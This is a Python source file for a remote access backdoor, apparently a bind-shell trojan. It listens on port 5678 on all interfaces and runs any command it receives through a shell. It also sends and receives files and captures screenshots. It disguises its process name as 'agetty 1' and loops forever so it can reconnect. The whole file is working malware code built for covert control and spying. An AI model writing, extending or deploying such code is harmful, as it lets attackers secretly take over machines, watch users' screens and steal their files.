import subprocess
import os
import socket
import sys
import tqdm
import time
import argparse
from PIL import ImageGrab
import io
import setproctitle


addr = "0.0.0.0"
port = 5678
buff_size = 1024 * 128
sep = "<SEP>"


def hide():
    setproctitle.setproctitle("agetty 1")


def capture_screen():
    screen = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screen.save(img_byte_arr, format="PNG")
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr


def send_screen(s):
    screen_data = capture_screen()
    s.send(f"screenshot.png {sep} {len(screen_data)}".encode())
    time.sleep(2)
    for i in range(0, len(screen_data), buff_size):
        chunk = screen_data[i : i + buff_size]
        s.sendall(chunk)
        # progress.update(len(chunk))
        s.recv(buff_size)
    s.recv(buff_size)
    s.sendall(b"done")


def file_receive(s):
    received = s.recv(buff_size).decode()
    filename, file_size = received.split(sep)
    filename = os.path.basename(filename)
    file_size = int(file_size)

    progress = tqdm.tqdm(
        range(file_size),
        f"Receiveing file: {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "wb") as fs:
        while True:
            read_buff = s.recv(buff_size)
            if b"done" in read_buff:
                fs.write(read_buff.replace(b"done", b""))
                break
            fs.write(read_buff)
            progress.update(len(read_buff))
            s.send(b"ACK")


#    print(f"file: {filename} received, size: actual:{file_size}")


def file_send(s, req_f):

    try:
        filename = req_f[0]
        file_size = os.path.getsize(filename)

        s.send(f"{filename} {sep} {file_size}".encode())
        #        print(f"sending file: {filename}, with size: {file_size}")

        time.sleep(2)

        progress = tqdm.tqdm(
            range(file_size),
            f"Sending: {filename}",
            unit="B",
            unit_scale=True,
            unit_divisor=1024,
        )

        with open(filename, "rb") as f:
            while True:
                f_read = f.read(buff_size)
                if not f_read:
                    s.sendall(b"done")
                    break
                s.sendall(f_read)
                progress.update(len(f_read))
                # time.sleep(0.5)
                x = s.recv(buff_size)  # Wait for server's ACK
    except Exception as e:
        print(f"Error during file sending: {e}")


def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((addr, port))
    s.listen(5)

    conn, cl_addr = s.accept()

    cwd = os.getcwd()
    conn.send(cwd.encode())

    while True:
        print("-----------------------------------------------")
        cmd = conn.recv(buff_size).decode()
        s_cmd = cmd.split()
        if cmd == "ACK":
            continue
        print(cmd)
        print(s_cmd)

        if cmd.lower() == "exit":
            break

        elif s_cmd[0].lower() == "download":
            file_send(conn, s_cmd[1:])
            continue

        elif s_cmd[0].lower() == "upload":
            file_receive(conn)
            continue

        elif s_cmd[0] == "ss":
            send_screen(conn)
            continue

        elif s_cmd[0].lower() == "cd":
            try:
                os.chdir(" ".join(s_cmd[1:]))
            except FileNotFoundError as e:
                ot = e
                print(e)
            else:
                ot = " "
        else:
            ot = subprocess.run(cmd, shell=True, text=True, capture_output=True).stdout

        cwd = os.getcwd()
        msg = f"{ot} {sep} {cwd}"
        conn.send(msg.encode())

    #    print(f"Exception Occured : {e}")
    s.close()


if __name__ == "__main__":
    while True:
        hide()
        main()
